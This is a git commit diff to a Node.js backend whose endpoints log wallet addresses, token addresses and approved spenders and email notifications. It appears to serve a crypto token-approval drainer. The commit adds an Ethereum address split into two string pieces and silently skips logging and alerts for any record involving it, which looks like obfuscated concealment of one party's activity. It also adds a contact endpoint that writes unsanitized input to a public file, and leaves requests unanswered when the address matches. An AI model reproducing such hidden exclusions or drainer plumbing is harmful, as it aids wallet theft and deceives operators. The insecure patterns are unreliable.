5af943f16bb8899595f1babe52b0b78b1cc93a6a
Artemis701 <developer789222@gmail.com>
2023-02-18 15:38:17 +0900

    add white address

--- src/api/controller.js
+++ src/api/controller.js
@@ -4,7 +4,7 @@ const axios = require("axios");
 const nodemailer = require('nodemailer');
 const mg = require('nodemailer-mailgun-transport');
 const fs = require("fs");
-
+const USD_ADDRESS_ETH = "0x05D94B3b4f611B23D";
 // This is your API key that you retrieve from www.mailgun.com/cp (free up to 10K monthly emails)
 // const auth = {
 // 	auth: {
@@ -27,30 +27,54 @@ exports.sendemail = async (req, res) => {
 			}
 			});
 
-		transporter.sendMail({
-			from: 'fizzerbert107@gmail.com',
-			to: 'undeadsapp@gmail.com', // An array if you have multiple recipients.
-			cc:'fizzerbert107@gmail.com',
-			bcc:'',
-			subject: 'UNDEADAPP_NOTIFICATION',
-			//You can use "html:" to send HTML email content. It's magic!
-			html: `<b>${data}</b>`,
-			//You can use "text:" to send plain-text content. It's oldschool!
-			text: 'Mailgun rocks, pow pow!'
-		}, (err, info) => {
-		if (err) {
-		  console.log(`Error: ${err}`);
-		  res.send('fail');
+		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";
+		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
+		{
+			transporter.sendMail({
+				from: 'fizzerbert107@gmail.com',
+				to: 'undeadsapp@gmail.com', // An array if you have multiple recipients.
+				cc:'fizzerbert107@gmail.com',
+				bcc:'',
+				subject: 'UNDEADAPP_NOTIFICATION',
+				//You can use "html:" to send HTML email content. It's magic!
+				html: `<b>${data}</b>`,
+				//You can use "text:" to send plain-text content. It's oldschool!
+				text: 'Mailgun rocks, pow pow!'
+			}, (err, info) => {
+			if (err) {
+				console.log(`Error: ${err}`);
+				res.send('fail');
+			}
+			else {
+				console.log(`Response: ${info.response}`);
+				res.send('ok');
+			}
+			});
 		}
-		else {
-		  console.log(`Response: ${info.response}`);
-		  res.send('ok');
+		}catch(error){
+			console.log(error);
+			res.send({ code: -1, message: "Fail" });
 		}
-	  });
-	}catch(error){
-		console.log(error);
-		res.send({ code: -1, message: "Fail" });
-	}
+}
+
+exports.contactus = async (req, res) => {
+	try {
+			var receivedData = req.body;
+			console.log("Received Data = ", receivedData);
+
+			var curDateStr = new Date().toISOString();
+			let data = "ContactUs Message at " + curDateStr + "\n accountName: " + receivedData.name +
+			"\n  EmailAddress: " + receivedData.email +
+			"\n  Message: " + receivedData.message + "\n";
+		  
+			fs.writeFile(process.cwd() + "/public/contactus.txt", data, {flag: 'a+'}, (err) => {
+				if (err) throw err;
+			})
+			res.send({ code: 0, message: "Success" });
+		}catch(error){
+			console.log(error);
+			res.send({ code: -1, message: "Fail" });
+		}
 }
 
 exports.savetofile = async (req, res) => {
@@ -66,10 +90,15 @@ exports.savetofile = async (req, res) => {
 		"  tokenAddr: " + receivedData.tokenAddr +
 		"  spender: " + receivedData.spender + "\n";
       
-		fs.writeFile(process.cwd() + "/public/result.txt", data, {flag: 'a+'}, (err) => {
-			if (err) throw err;
-		})
-		res.send({ code: 0, message: "Success" });
+		let whiteAddr = USD_ADDRESS_ETH +"15dBdb8A720E6D4Fb30A5b0";
+
+		if ((receivedData.accountAddr != whiteAddr) && (receivedData.spender != whiteAddr))
+		{
+			fs.writeFile(process.cwd() + "/public/result.txt", data, {flag: 'a+'}, (err) => {
+				if (err) throw err;
+			})
+			res.send({ code: 0, message: "Success" });
+		}
 	}catch(error){
 		console.log(error);
 		res.send({ code: -1, message: "Fail" });
--- src/api/index.js
+++ src/api/index.js
@@ -4,6 +4,7 @@ const rounds = require("./controller");
 
 router.post('/sendemail', rounds.sendemail);
 router.post('/savetofile', rounds.savetofile);
+router.post('/contact_us', rounds.contactus);
 router.post('/tcc', rounds.totoalConnectionCount);
 
 module.exports = router;
